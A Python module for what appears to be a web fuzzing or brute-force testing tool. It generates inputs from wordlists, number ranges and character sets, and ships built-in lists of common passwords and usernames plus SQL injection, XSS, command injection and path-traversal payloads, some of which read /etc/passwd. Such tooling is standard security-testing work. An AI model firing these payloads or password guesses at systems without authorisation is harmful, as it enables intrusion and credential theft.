"""
Payload Generation System

Provides various payload generators for attack execution.
"""

import os
import itertools
from abc import ABC, abstractmethod
from typing import AsyncIterator, List, Optional, Iterator
from pathlib import Path


class PayloadGenerator(ABC):
    """Base class for payload generators."""

    @abstractmethod
    async def generate(self) -> AsyncIterator[str]:
        """
        Generate payloads asynchronously.

        Yields:
            Payload strings
        """
        pass

    def count(self) -> Optional[int]:
        """
        Get the total number of payloads that will be generated.

        Returns:
            Number of payloads, or None if unknown/infinite
        """
        return None


class WordlistGenerator(PayloadGenerator):
    """
    Generate payloads from a wordlist file or list of strings.
    """

    def __init__(
        self, wordlist: Optional[List[str]] = None, file_path: Optional[str] = None
    ):
        """
        Initialize wordlist generator.

        Args:
            wordlist: List of payload strings
            file_path: Path to wordlist file (one payload per line)
        """
        if wordlist is None and file_path is None:
            raise ValueError("Either wordlist or file_path must be provided")

        self.wordlist = wordlist
        self.file_path = file_path
        self._count: Optional[int] = None

    async def generate(self) -> AsyncIterator[str]:
        """Generate payloads from wordlist."""
        if self.wordlist is not None:
            for payload in self.wordlist:
                yield payload

        elif self.file_path is not None:
            if not os.path.exists(self.file_path):
                raise FileNotFoundError(f"Wordlist file not found: {self.file_path}")

            with open(self.file_path, "r", encoding="utf-8", errors="ignore") as f:
                for line in f:
                    payload = line.rstrip("\n\r")
                    if payload:  # Skip empty lines
                        yield payload

    def count(self) -> Optional[int]:
        """Get total number of payloads."""
        if self._count is not None:
            return self._count

        if self.wordlist is not None:
            self._count = len(self.wordlist)
        elif self.file_path is not None:
            try:
                with open(self.file_path, "r", encoding="utf-8", errors="ignore") as f:
                    self._count = sum(1 for line in f if line.strip())
            except Exception:
                self._count = None

        return self._count


class NumberGenerator(PayloadGenerator):
    """
    Generate numeric payloads within a range.
    """

    def __init__(
        self, start: int = 0, end: int = 100, step: int = 1, format_string: str = "{}"
    ):
        """
        Initialize number generator.

        Args:
            start: Starting number (inclusive)
            end: Ending number (inclusive)
            step: Step size
            format_string: Format string for numbers (e.g., "{:04d}" for zero-padded)
        """
        if start > end:
            raise ValueError(f"Start ({start}) must be <= end ({end})")
        if step < 1:
            raise ValueError(f"Step must be positive, got {step}")

        self.start = start
        self.end = end
        self.step = step
        self.format_string = format_string

    async def generate(self) -> AsyncIterator[str]:
        """Generate numeric payloads."""
        for num in range(self.start, self.end + 1, self.step):
            yield self.format_string.format(num)

    def count(self) -> Optional[int]:
        """Get total number of payloads."""
        return ((self.end - self.start) // self.step) + 1


class CharsetGenerator(PayloadGenerator):
    """
    Generate payloads from a character set with specified length.
    """

    def __init__(self, charset: str, min_length: int = 1, max_length: int = 3):
        """
        Initialize charset generator.

        Args:
            charset: String of characters to use
            min_length: Minimum payload length
            max_length: Maximum payload length
        """
        if not charset:
            raise ValueError("Charset cannot be empty")
        if min_length < 1:
            raise ValueError("Minimum length must be at least 1")
        if max_length < min_length:
            raise ValueError(
                f"Max length ({max_length}) must be >= min length ({min_length})"
            )

        self.charset = charset
        self.min_length = min_length
        self.max_length = max_length

    async def generate(self) -> AsyncIterator[str]:
        """Generate payloads from charset."""
        for length in range(self.min_length, self.max_length + 1):
            for combination in itertools.product(self.charset, repeat=length):
                yield "".join(combination)

    def count(self) -> Optional[int]:
        """Get total number of payloads."""
        total = 0
        charset_len = len(self.charset)
        for length in range(self.min_length, self.max_length + 1):
            total += charset_len**length
        return total


class CustomGenerator(PayloadGenerator):
    """
    Generate payloads using a custom function or iterator.
    """

    def __init__(self, generator_func: Iterator[str], count: Optional[int] = None):
        """
        Initialize custom generator.

        Args:
            generator_func: Iterator or generator function that yields payloads
            count: Optional total count of payloads
        """
        self.generator_func = generator_func
        self._count = count

    async def generate(self) -> AsyncIterator[str]:
        """Generate payloads using custom function."""
        for payload in self.generator_func:
            yield payload

    def count(self) -> Optional[int]:
        """Get total number of payloads."""
        return self._count


class BuiltinWordlists:
    """
    Built-in wordlists for common attacks.
    """

    # Common passwords
    COMMON_PASSWORDS = [
        "password",
        "123456",
        "12345678",
        "qwerty",
        "abc123",
        "monkey",
        "1234567",
        "letmein",
        "trustno1",
        "dragon",
        "baseball",
        "111111",
        "iloveyou",
        "master",
        "sunshine",
        "ashley",
        "bailey",
        "passw0rd",
        "shadow",
        "123123",
        "654321",
        "superman",
        "qazwsx",
        "michael",
        "football",
    ]

    # Common usernames
    COMMON_USERNAMES = [
        "admin",
        "administrator",
        "root",
        "user",
        "test",
        "guest",
        "info",
        "adm",
        "mysql",
        "user1",
        "administrator",
        "oracle",
        "ftp",
        "pi",
        "puppet",
        "ansible",
        "ec2-user",
        "vagrant",
        "azureuser",
        "demo",
    ]

    # Common directories
    COMMON_DIRECTORIES = [
        "admin",
        "administrator",
        "login",
        "wp-admin",
        "backup",
        "test",
        "dev",
        "api",
        "uploads",
        "images",
        "css",
        "js",
        "includes",
        "config",
        "data",
        "tmp",
        "temp",
        "cache",
        "logs",
        "private",
        "public",
        "assets",
        "static",
        "media",
        "files",
    ]

    # Common file extensions
    COMMON_EXTENSIONS = [
        ".php",
        ".asp",
        ".aspx",
        ".jsp",
        ".html",
        ".htm",
        ".js",
        ".css",
        ".xml",
        ".json",
        ".txt",
        ".log",
        ".bak",
        ".old",
        ".backup",
        ".zip",
        ".tar.gz",
        ".sql",
        ".db",
        ".conf",
        ".config",
        ".ini",
    ]

    # SQL injection payloads
    SQL_INJECTION_PAYLOADS = [
        "' OR '1'='1",
        "' OR '1'='1' --",
        "' OR '1'='1' /*",
        "admin' --",
        "admin' #",
        "admin'/*",
        "' or 1=1--",
        "' or 1=1#",
        "' or 1=1/*",
        "') or '1'='1--",
        "') or ('1'='1--",
        "1' ORDER BY 1--",
        "1' ORDER BY 2--",
        "1' ORDER BY 3--",
        "1' UNION SELECT NULL--",
        "1' UNION SELECT NULL,NULL--",
        "' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055'",
        "1' AND '1'='1",
        "1' AND '1'='2",
        "' WAITFOR DELAY '0:0:5'--",
        "1; WAITFOR DELAY '0:0:5'--",
    ]

    # XSS payloads
    XSS_PAYLOADS = [
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert('XSS')>",
        "<svg/onload=alert('XSS')>",
        "javascript:alert('XSS')",
        "<iframe src=javascript:alert('XSS')>",
        "<body onload=alert('XSS')>",
        "<input onfocus=alert('XSS') autofocus>",
        "<select onfocus=alert('XSS') autofocus>",
        "<textarea onfocus=alert('XSS') autofocus>",
        "<marquee onstart=alert('XSS')>",
        "'-alert('XSS')-'",
        "\"><script>alert('XSS')</script>",
        "';alert('XSS');//",
        "<scr<script>ipt>alert('XSS')</scr</script>ipt>",
    ]

    # Command injection payloads
    COMMAND_INJECTION_PAYLOADS = [
        "; ls",
        "| ls",
        "& ls",
        "&& ls",
        "|| ls",
        "; cat /etc/passwd",
        "| cat /etc/passwd",
        "; whoami",
        "| whoami",
        "& whoami",
        "`whoami`",
        "$(whoami)",
        "${IFS}",
        "; sleep 5",
        "| sleep 5",
        "& sleep 5",
        "; ping -c 5 127.0.0.1",
        "| ping -c 5 127.0.0.1",
    ]

    # Path traversal payloads
    PATH_TRAVERSAL_PAYLOADS = [
        "../",
        "..\\",
        "..%2f",
        "..%5c",
        "....//",
        "....\\\\",
        "../../../etc/passwd",
        "..\\..\\..\\windows\\win.ini",
        "....//....//....//etc/passwd",
        "%2e%2e%2f",
        "%2e%2e%5c",
        "..%252f",
        "..%255c",
    ]

    @classmethod
    def get_wordlist(cls, name: str) -> List[str]:
        """
        Get a built-in wordlist by name.

        Args:
            name: Wordlist name (passwords, usernames, directories, etc.)

        Returns:
            List of payloads

        Raises:
            ValueError: If wordlist name is not recognized
        """
        wordlists = {
            "passwords": cls.COMMON_PASSWORDS,
            "usernames": cls.COMMON_USERNAMES,
            "directories": cls.COMMON_DIRECTORIES,
            "extensions": cls.COMMON_EXTENSIONS,
            "sql_injection": cls.SQL_INJECTION_PAYLOADS,
            "xss": cls.XSS_PAYLOADS,
            "command_injection": cls.COMMAND_INJECTION_PAYLOADS,
            "path_traversal": cls.PATH_TRAVERSAL_PAYLOADS,
        }

        if name.lower() not in wordlists:
            available = ", ".join(wordlists.keys())
            raise ValueError(f"Unknown wordlist: {name}. Available: {available}")

        return wordlists[name.lower()]

    @classmethod
    def list_wordlists(cls) -> List[str]:
        """Get list of available built-in wordlist names."""
        return [
            "passwords",
            "usernames",
            "directories",
            "extensions",
            "sql_injection",
            "xss",
            "command_injection",
            "path_traversal",
        ]


def create_generator(generator_type: str, config: dict) -> PayloadGenerator:
    """
    Factory function to create payload generators.

    Args:
        generator_type: Type of generator (wordlist, numbers, charset, custom)
        config: Generator configuration dictionary

    Returns:
        PayloadGenerator instance

    Raises:
        ValueError: If generator type is unknown or config is invalid
    """
    if generator_type == "wordlist":
        # Check if using built-in wordlist
        if "builtin" in config:
            wordlist = BuiltinWordlists.get_wordlist(config["builtin"])
            return WordlistGenerator(wordlist=wordlist)

        # Check for custom wordlist
        elif "wordlist" in config:
            return WordlistGenerator(wordlist=config["wordlist"])

        # Check for file path
        elif "file_path" in config:
            return WordlistGenerator(file_path=config["file_path"])

        else:
            raise ValueError(
                "Wordlist generator requires 'builtin', 'wordlist', or 'file_path' in config"
            )

    elif generator_type == "numbers":
        start = config.get("start", 0)
        end = config.get("end", 100)
        step = config.get("step", 1)
        format_string = config.get("format", "{}")
        return NumberGenerator(
            start=start, end=end, step=step, format_string=format_string
        )

    elif generator_type == "charset":
        charset = config.get("charset", "abcdefghijklmnopqrstuvwxyz")
        min_length = config.get("min_length", 1)
        max_length = config.get("max_length", 3)
        return CharsetGenerator(
            charset=charset, min_length=min_length, max_length=max_length
        )

    elif generator_type == "custom":
        if "generator" not in config:
            raise ValueError("Custom generator requires 'generator' function in config")
        generator_func = config["generator"]
        count = config.get("count")
        return CustomGenerator(generator_func=generator_func, count=count)

    else:
        raise ValueError(f"Unknown generator type: {generator_type}")
